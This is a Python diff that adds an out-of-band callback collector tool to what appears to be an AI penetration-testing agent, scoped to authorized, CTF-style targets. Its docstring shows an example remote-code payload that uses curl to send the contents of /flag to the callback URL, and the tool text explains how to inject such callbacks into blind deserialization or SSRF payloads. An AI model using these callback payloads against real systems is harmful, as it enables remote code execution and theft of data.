@@ -331,6 +331,39 @@ def http_raw(url: str, method: str = "GET", body: str = "",
                    if header_problems else {})}
 
 
+def oob_read(port: int = 9911, wait: float = 2.0, clear: bool = False) -> dict:
+    """盲打带外（OOB）结果回传原语：收"目标侧出网回连"的回调。
+
+    零回显靶（盲打反序列化 / 盲 SSRF / 盲 RCE）的标准外带通道：
+    1. 首次调用本工具 → 内核在 127.0.0.1:<port> 起一个回调收集器
+       （懒启动、幂等；端口被占自动 +1 上移，实际端口看返回值）；
+    2. 在目标侧载荷里注入回连——容器内 curl / wget / python urllib 均可：
+       `os.system("curl 'http://127.0.0.1:<port>/exfil?data='+$(cat /flag)")`
+       或 pickle exec gadget 里 `urllib.request.urlopen(...)`；
+    3. 再调本工具取回调明细（时间/来源/路径/查询串/UA）。
+
+    `wait`：取结果前先等几秒（异步回连留时间，上限 10s）；`clear`：取走
+    即清零。只监听 127.0.0.1——与授权目标白名单同口径，不对局域网开放。
+    """
+    import time as _time
+
+    from penagent import oob
+
+    wait = max(0.0, min(float(wait), 10.0))
+    try:
+        actual = oob.start(int(port))
+    except (OSError, ValueError) as exc:
+        return {"ok": False, "error": f"OOB 收集器启动失败: {exc}"}
+    if wait > 0:
+        _time.sleep(wait)
+    hits = oob.read_hits(actual, clear=bool(clear))
+    return {"ok": True, "port": actual,
+            "callback": oob.callback_hint(actual),
+            "count": len(hits), "hits": hits,
+            "hint": ("把 callback 注入目标载荷（curl/wget/python urllib），"
+                     "回连后再调本工具收结果；wait 留给异步回连")}
+
+
 def report_gen(mission_id: str = "", format: str = "markdown",
                out: str = "", data_dir: str = "") -> dict:
     """从证据链/作战记录产出报告（markdown）或 SARIF 2.1.0（机器可读）。
@@ -439,6 +472,16 @@ def register_builtins(registry) -> None:
                              "compare_body": {"type": "boolean"},
                              "timeout": {"type": "number"}},
                  fn=replay_request),
+        ToolSpec(name="oob_read",
+                 description=("盲打带外回传原语：在 127.0.0.1:<port> 起/复用"
+                              "回调收集器，返回目标侧出网回连的明细。零回显靶"
+                              "（盲反序列化/盲 RCE/盲 SSRF）标准外带通道：载荷"
+                              "里让目标 curl/wget/urllib 回连 callback 地址即"
+                              "可带走数据；wait 等异步回连，clear 取走即清"),
+                 parameters={"port": {"type": "number"},
+                             "wait": {"type": "number"},
+                             "clear": {"type": "boolean"}},
+                 fn=oob_read),
         ToolSpec(name="report_gen",
                  description=("从证据链产出报告：markdown（人读汇总）或 "
                               "sarif（SARIF 2.1.0，机器可读）。可选 out 落盘到"
